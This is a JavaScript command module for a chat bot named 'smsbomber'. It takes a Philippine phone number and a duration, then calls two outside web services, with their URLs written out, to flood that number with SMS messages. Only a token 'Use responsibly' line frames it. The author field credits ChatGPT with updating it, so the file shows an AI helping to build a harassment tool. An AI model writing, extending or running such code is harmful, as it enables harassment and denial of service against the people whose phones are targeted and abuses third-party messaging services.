const axios = require("axios");

module.exports = {
  config: {
    name: "smsbomber",
    version: "1.0.5",
    author: "vernex + updated by ChatGPT",
    description: "Send SMS to PH numbers only using two APIs sequentially",
    cooldowns: 10,
    dependencies: {
      axios: ""
    }
  },

  run: async function ({ api, event, args }) {
    const { threadID, messageID } = event;

    if (!args[0] || !args[1]) {
      return api.sendMessage(
        "📤 Usage:\n/smsbomber [phone_number] [amount_in_seconds]\n\nExample:\n/smsbomber 09503596043 10",
        threadID,
        messageID
      );
    }

    const phone = args[0];
    const amount = parseInt(args[1]);

    // ✅ PH number validation
    const isValidPH = /^(\+639|09)\d{9}$/.test(phone);
    if (!isValidPH) {
      return api.sendMessage(
        "❌ Invalid number. Only Philippine numbers are allowed.\nFormat must be: 09XXXXXXXXX or +639XXXXXXXXX",
        threadID,
        messageID
      );
    }

    if (isNaN(amount) || amount <= 0 || amount > 60) {
      return api.sendMessage("❌ Invalid amount. Please enter a number between 1 and 60.", threadID, messageID);
    }

    try {
      await api.sendMessage(
        `📡 Bombing ${phone} for ${amount} seconds using both APIs...`,
        threadID,
        messageID
      );

      const api1 = `https://haji-mix.up.railway.app/api/smsbomber?phone=${encodeURIComponent(phone)}&times=${amount}`;
      const api2 = `https://smsbomb-nethws3.up.railway.app/bomb?number=${encodeURIComponent(phone)}&seconds=${amount}`;

      let messages = [];

      // --- API 1 ---
      try {
        const response1 = await axios.get(api1);
        const data1 = response1.data;

        if (data1.status !== false) {
          messages.push(`
════『 𝗦𝗠𝗦 𝗕𝗢𝗠𝗕𝗘𝗥 - API 1 (Haji Mix) 』════

📞 Target: ${phone}
📨 Amount: ${amount} SMS
✅ Status: Success

> Use responsibly.
          `.trim());
        } else {
          messages.push(`❌ API 1 failed: ${data1.message || "No response message"}`);
        }
      } catch (err1) {
        messages.push(`⚠️ API 1 failed: ${err1.message}`);
      }

      // --- API 2 ---
      try {
        const response2 = await axios.get(api2);
        const data2 = response2.data;

        if (data2.message && data2.message.toLowerCase().includes("success")) {
          messages.push(`
════『 𝗦𝗠𝗦 𝗕𝗢𝗠𝗕𝗘𝗥 - API 2 (NetHWS3) 』════

📞 Target: ${data2.number}
⏱ Duration: ${data2.seconds}
✅ Status: ${data2.message}

> Use responsibly.
          `.trim());
        } else {
          messages.push(`❌ API 2 response: ${data2.message || "Unknown error"}`);
        }
      } catch (err2) {
        messages.push(`⚠️ API 2 failed: ${err2.message}`);
      }

      // Final output
      return api.sendMessage(messages.join("\n\n"), threadID, messageID);

    } catch (error) {
      console.error("❌ Unexpected Error:", error.message);
      return api.sendMessage(`❌ Error: ${error.message}`, threadID, messageID);
    }
  }
};
